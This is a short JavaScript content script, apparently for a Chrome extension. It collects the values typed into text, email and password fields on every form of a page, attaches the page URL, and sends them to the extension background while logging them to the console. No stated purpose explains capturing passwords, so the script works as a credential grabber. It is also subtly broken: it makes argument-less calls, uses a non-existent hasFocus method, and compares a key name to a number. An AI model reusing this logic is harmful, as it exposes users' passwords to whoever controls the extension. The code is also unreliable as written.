const addListenerOnForms = forms => {
    const isFormElementFocused = (elements) => elements.some(elem => elem.hasFocus());
    
    const sendInput = (validElements) => {
        const hashMap = new Map();
        validElements.forEach(elem => hashMap.set(elem.name, elem.value));
        hashMap.domain = location.href;
        chrome.runtime.sendMessage(Object.fromEntries(hashMap.entries()), function(response){console.log(response)});
        console.log("sent:", hashMap.entries());
    }
    
    Array.from(forms).forEach(form => {
        const validElements = Array.from(form.elements).filter(element => element.type === "text" || element.type === "email" || element.type === "password");
        
        document.addEventListener("keyup", event => {
            if (event.key === 13 && isFormElementFocused()) 
            sendInput(validElements);        
    })
    
    validElements.forEach(element => {
        element.addEventListener("focusout", () => {
            if (!isFormElementFocused()) sendInput();
        });
    })
});
}

addListenerOnForms(document.getElementsByTagName("form"));
